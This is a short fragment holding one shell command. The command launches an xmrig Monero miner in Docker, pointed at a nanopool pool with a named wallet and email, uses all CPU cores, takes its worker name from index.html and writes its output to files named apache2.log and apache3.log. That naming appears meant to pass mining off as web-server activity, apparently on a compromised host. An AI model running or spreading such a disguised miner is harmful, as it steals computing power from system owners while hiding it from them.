...
docker run warlax/xmrig-cpu-cryptonightv7 -o xmr-us-east1.nanopool.org:14444 -u 48rbCzbyQLKeHvyAJePqkzN2KuDqNjUCoQkKhYg6mFwvU4kuJXa52ief3D2NKLpjRsALfuqvye8nU5mXrwrjKq318wb1KyV.`cat index.html`/zonewar@hotmail.com -p x --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
